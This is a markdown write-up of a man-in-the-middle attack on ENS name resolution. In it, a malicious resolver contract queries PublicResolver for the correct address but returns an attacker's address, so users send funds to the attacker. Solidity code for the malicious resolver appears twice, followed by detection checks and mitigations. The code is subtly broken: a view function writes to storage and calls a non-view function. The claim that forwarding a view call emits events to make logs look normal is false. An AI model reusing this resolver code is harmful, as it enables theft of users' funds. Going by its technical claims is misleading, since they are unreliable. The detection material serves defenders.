# Man-in-the-Middle Attack via Malicious Resolver

## The Attack

A sophisticated man-in-the-middle attack where the malicious resolver intercepts resolution calls, queries PublicResolver for the correct address, but returns a malicious address to the caller.

## Attack Flow

### Step 1: User Queries Malicious Resolver

User (or DApp) calls:
```solidity
address resolved = maliciousResolver.addr(namehash);
```

### Step 2: Malicious Resolver Intercepts

```solidity
function addr(bytes32 node) external view returns (address payable) {
    // 1. Query PublicResolver to get CORRECT address
    address correctAddress = publicResolver.addr(node);
    
    // 2. Store it (for obfuscation)
    interceptedAddresses[node] = correctAddress;
    
    // 3. Return MALICIOUS address instead
    return payable(attacker);
}
```

### Step 3: User Sends Funds

User thinks they're sending to the correct address, but actually sends to attacker:
```solidity
// User expects: correctAddress
// User gets: attacker address
// Funds go to: attacker
```

### Step 4: Obfuscation (Optional)

To make debugging harder, malicious resolver can forward to PublicResolver:
```solidity
function _forwardToPublicResolver(bytes32 node) internal {
    // Call PublicResolver to emit events
    // This makes it look like normal resolution happened
    publicResolver.addr(node);
    // Events emitted, logs look normal
}
```

## Why This Works

1. **User doesn't know resolver is malicious** - DApp JavaScript changed it
2. **Malicious resolver looks legitimate** - It queries PublicResolver
3. **Returns different address** - User gets attacker's address
4. **Obfuscation** - Events/logs look normal

## Attack Scenario

### Setup
1. Attacker registers "testreentrancy.eth" with malicious resolver
2. DApp JavaScript (compromised) sets resolver to malicious resolver
3. Legitimate owner sets address in PublicResolver: `0xCORRECT...`

### Execution
1. User queries: `maliciousResolver.addr("testreentrancy.eth")`
2. Malicious resolver queries: `publicResolver.addr("testreentrancy.eth")` → `0xCORRECT...`
3. Malicious resolver returns: `0xATTACKER...` (malicious address)
4. User sends funds to: `0xATTACKER...` (thinking it's `0xCORRECT...`)
5. Funds go to attacker

### Obfuscation
- Malicious resolver can forward to PublicResolver to emit events
- Logs show normal resolution happened
- Debugging is harder because events look legitimate

## Impact

- **Fund Theft**: Users send funds to attacker instead of intended recipient
- **Stealth**: Attack is hard to detect (resolver looks legitimate)
- **Obfuscation**: Events/logs make it look normal
- **Scale**: Works for any name that uses malicious resolver

## Detection

### Signs of Attack
1. Resolver address is not PublicResolver
2. Resolved address doesn't match PublicResolver's address
3. Events show resolution but funds go to wrong address

### How to Check
```solidity
// Check if resolver is malicious
address resolver = ens.resolver(namehash);
if (resolver != PUBLIC_RESOLVER_ADDRESS) {
    // WARNING: Custom resolver!
}

// Compare addresses
address publicAddr = publicResolver.addr(namehash);
address resolvedAddr = IAddrResolver(resolver).addr(namehash);
if (publicAddr != resolvedAddr) {
    // ATTACK: Addresses don't match!
}
```

## Mitigation

1. **Always verify resolver address** before trusting resolution
2. **Compare with PublicResolver** - If resolver is not PublicResolver, double-check
3. **User warnings** - Warn users about custom resolvers
4. **Transaction preview** - Show resolved address before sending
5. **Resolver whitelist** - Only allow trusted resolvers in DApps

## Code Example

```solidity
// Malicious resolver implementation
function addr(bytes32 node) external view returns (address payable) {
    // Query PublicResolver for correct address
    address correctAddress = publicResolver.addr(node);
    
    // Store for obfuscation
    interceptedAddresses[node] = correctAddress;
    
    // Optionally forward to emit events (obfuscation)
    _forwardToPublicResolver(node);
    
    // Return malicious address
    return payable(attacker);
}

function _forwardToPublicResolver(bytes32 node) internal {
    // Forward to PublicResolver to emit events
    // Makes logs look normal
    try publicResolver.addr(node) returns (address payable) {
        // Events emitted, looks legitimate
    } catch {}
}
```

## Conclusion

This is a sophisticated attack that:
- Intercepts resolution calls
- Queries correct address from PublicResolver
- Returns malicious address to caller
- Optionally obfuscates with event forwarding

The attack is particularly dangerous because:
1. It's hard to detect (resolver looks legitimate)
2. It works for any name using malicious resolver
3. Obfuscation makes debugging difficult
4. Users lose funds without realizing
